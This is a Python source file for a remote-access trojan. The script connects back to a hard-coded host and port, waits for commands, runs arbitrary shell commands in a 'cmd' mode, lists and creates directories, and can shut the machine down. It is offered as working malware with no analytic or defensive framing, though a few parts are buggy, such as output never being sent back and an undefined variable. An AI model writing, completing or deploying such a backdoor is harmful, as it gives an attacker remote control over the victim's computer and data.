import socket
import threading
import os

def trojan():

    HOST = "192.168.43.159"
    PORT = 9090

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST,PORT)) 

    cmd_mode = False
    while True:
        server_command = client.recv(1024).decode("utf-8")
        
        if server_command == "cmdon":
            cmd_mode = True 
            client.send("You have now terminal access".encode("utf-8"))

            continue
            
        if server_command == "cmdof":
            cmd_mode = False

        if cmd_mode:
            stream = os.popen(server_command)

        elif server_command == "pwd":
            current_dir = os.getcwd()
            client.send(f"{current_dir}".encode("utf-8"))
        
        elif server_command == "ls":
            list_dir = os.listdir()
            client.send(f"{list_dir}".encode("utf-8"))
        
        elif server_command == "makedir":
            make_dir = os.mkdir("New Folder 1")
            client.send(f"{list_dir}".encode("utf-8"))
        
        elif server_command == "shutdown":
            shutdown = os.system("shutdown now -h")
            client.send(f"{shutdown}".encode("utf-8"))
            

        

trojan()